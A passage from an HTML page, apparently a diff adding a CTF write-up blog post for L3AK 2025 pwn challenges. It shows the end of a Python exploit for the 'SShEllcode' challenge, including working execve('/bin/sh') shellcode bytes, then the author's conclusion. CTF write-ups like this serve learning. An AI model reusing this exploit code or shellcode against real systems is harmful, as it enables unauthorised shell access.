+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;psrlq xmm0, </span><span style="color:#e6db74">{</span>df<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">paddq xmm1, xmm0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;paddq xmm1, xmm0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">17</span>:
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;movq rdx, xmm0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    st <span style="color:#f92672">=</span> i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq rbx, xmm1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq xmm0, r11
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq xmm1, xmm0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>st, arr <span style="color:#f92672">=</span> find_value(<span style="color:#ae81ff">0x13370153</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> arr:
+</span></span><span style="display:flex;"><span>    df <span style="color:#f92672">=</span> st <span style="color:#f92672">-</span> i
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> df <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;psrlq xmm0, </span><span style="color:#e6db74">{</span>df<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">paddq xmm1, xmm0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    st <span style="color:#f92672">=</span> i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq rax, xmm1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">psrlq xmm0, 2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">paddq xmm1, xmm0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">psllq xmm0, 3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">paddq xmm1, xmm0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq rsp, xmm1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">17</span>):
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;movq xmm1, r10</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;xorps xmm2, xmm2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> asm(code)
+</span></span><span style="display:flex;"><span>sl(sc<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># execve(&#34;/bin/sh&#34;, 0, 0) - shellcode</span>
+</span></span><span style="display:flex;"><span>new_sc <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x159</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>s(new_sc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ia()
+</span></span></code></pre></div><p>Full exploit can be found here: <a href="/blog/scripts/l3ak25/sshellcode.py">exploit.py</a></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>AAll things considered, this CTF was fun. I liked the challenges,
+and even though some of them had boring parts, I still had a good time solving them.</p>
+<p>Also, it’s been a long time since I fully solved a PWN category (not including baby CTFs)
+all by myself. The reason for that is probably because the CTF was medium difficulty
+and I played solo without my team.</p>
+<p>I hope I helped someone who wanted to read writeups for these challenges,
+and thanks for reading.</p>
+
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#challenges">Challenges</a>
+      <ul>
+        <li><a href="#safe-gets">Safe Gets</a></li>
+        <li><a href="#the-goose">The Goose</a></li>
+        <li><a href="#chunky-threads">Chunky Threads</a></li>
+        <li><a href="#go-write-where">Go Write Where</a></li>
+        <li><a href="#cosmofile">cosmofile</a></li>
+        <li><a href="#notes">Notes++</a></li>
+        <li><a href="#sshellcode">SShEllcode</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
